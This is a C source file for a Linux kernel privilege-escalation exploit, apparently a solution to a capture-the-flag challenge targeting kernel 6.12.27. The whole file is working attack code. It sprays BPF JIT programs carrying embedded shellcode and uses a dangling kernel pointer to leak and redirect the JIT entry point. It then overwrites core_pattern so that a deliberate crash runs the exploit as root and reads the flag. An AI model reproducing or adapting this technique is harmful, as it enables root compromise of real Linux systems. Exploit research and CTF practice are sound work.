#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <stdio.h>
#include <sys/prctl.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "libs/pwn.h"

#ifndef SYS_pidfd_getfd
#define SYS_pidfd_getfd 438
#endif
#ifndef SYS_pidfd_open
#define SYS_pidfd_open 434
#endif

/*******************************
 * EXPLOIT                     *
 *******************************/

#define CORE_PATTERN_TARGET "|/proc/%P/fd/666 %P"
#define SHELL_CMD "cat /flag"

#define BPF_JIT_SIZE 0x200
// trigger vmalloc
#define BPF_PROG_SIZE 0x2000
#define SPRAY_VULN 0x100
#define SPRAY_BPF 0x100

int jit_sockets[BPF_JIT_SIZE][2] = {0};

void bpf_spray() {
  unsigned int prog_len = BPF_JIT_SIZE;
  struct sock_filter filter[BPF_JIT_SIZE];
  char buf[0x1000];

  linfo("prep bpf payload");

  struct sock_filter table[] = {
      {.code = BPF_LD + BPF_K, .k = 0xb3909090},
      {.code = BPF_RET + BPF_K, .k = 1},
  };

  for (int i = 0; i < prog_len; ++i)
    filter[i] = table[0];

  filter[prog_len - 1] = table[1];
  int idx = prog_len - 2;

#include "linux6.12.27/sc.h"

  CHK(idx >= 0);

  struct sock_fprog prog = {
      .len = prog_len,
      .filter = filter,
  };

  for (int i = 0; i < SPRAY_BPF; i++) {
    SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, jit_sockets[i]));
    SYSCHK(setsockopt(jit_sockets[i][0], SOL_SOCKET, SO_ATTACH_FILTER, &prog,
                      sizeof(prog)));
    SYSCHK(write(jit_sockets[i][0], "x", 1));
  }
}

int check_core() {
  // Check if /proc/sys/kernel/core_pattern has been overwritten
  char buf[0x100] = {};
  int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
  SYSCHK(read(core, buf, sizeof(buf)));
  close(core);
  return strncmp(buf, CORE_PATTERN_TARGET, 0x10) == 0;
}

void crash() {
  pin_cpu(0, 1);
  int memfd = memfd_create("", 0);
  SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
  dup2(memfd, 666);
  close(memfd);
  while (check_core() == 0)
    usleep(100000);
  lstage("Root shell !!");
  fputs(LINFO "flag: ", stdout);
  *(sz *)0 = 0;
}

int main(int argc, char *argv[]) {

  void *keap_ptr;
  sz leak[BPF_PROG_SIZE / sizeof(sz)] = {0};
  char clear[BPF_PROG_SIZE] = {0};

  if (argc > 1) {
    int pid = strtoull(argv[1], 0, 10);
    int pfd = syscall(SYS_pidfd_open, pid, 0);
    int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
    int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
    int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
    dup2(stdinfd, STDIN_FILENO);
    dup2(stdoutfd, STDOUT_FILENO);
    dup2(stderrfd, STDERR_FILENO);
    CHK(system(SHELL_CMD) == EXIT_SUCCESS);
    exit(EXIT_SUCCESS);
  }

  lstage("INIT");

  if (fork() != 0)
    crash();

  rlimit_increase(RLIMIT_NOFILE);
  pin_cpu(0, 0);

  init();

  lstage("START");

  linfo("created dangeling ptrs");

  void *keap_ptrs[SPRAY_VULN] = {0};
  for (int i = 0; i < SPRAY_VULN; i++)
    keap_ptrs[i] = keap_malloc(BPF_PROG_SIZE, GFP_KERNEL);

  for (int i = 0; i < SPRAY_VULN; i++) {
    keap_free(keap_ptrs[i]);
    if (i == SPRAY_VULN / 2)
      keap_ptr = keap_ptrs[i];
  }

  linfo("dangeling ptr: %p", keap_ptr);

  bpf_spray();

  keap_read(keap_ptr, leak, BPF_PROG_SIZE);

#ifdef DEBUG
  print_hex(leak, BPF_PROG_SIZE);
#endif

  void *bpf_jit_leak = NULL;
  sz bpf_off = 0;
  for (int i = 0x30; i < BPF_PROG_SIZE; i += 0x1000) {
    if (leak[i / 8] >> 0x20 == 0xffffffff) {
      bpf_jit_leak = (void *)leak[i / 8];
      bpf_off = i;
      break;
    }
  }

  if (bpf_jit_leak == NULL)
    lerror("bpf_jit_leak not found");

  lhex(bpf_jit_leak);

  linfo("corrupt bpf entrypoint");
  bpf_jit_leak += 0x25;

  char *core = (void *)mmap((void *)0xa00000, 0x1000, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_FIXED | MAP_ANON, -1, 0);
  strcpy(core, CORE_PATTERN_TARGET);

  keap_write(keap_ptr + bpf_off, &bpf_jit_leak, sizeof(sz));

#ifdef DEBUG
  keap_read(keap_ptr, leak, BPF_PROG_SIZE);
  print_hex(leak, BPF_PROG_SIZE);
#endif

  linfo("trigger bpf payload");

  char x;
  for (int i = 0; i < SPRAY_BPF; i++)
    SYSCHK(write(jit_sockets[i][1], "x", 1));

  lerror("failed");

  return 0;
}
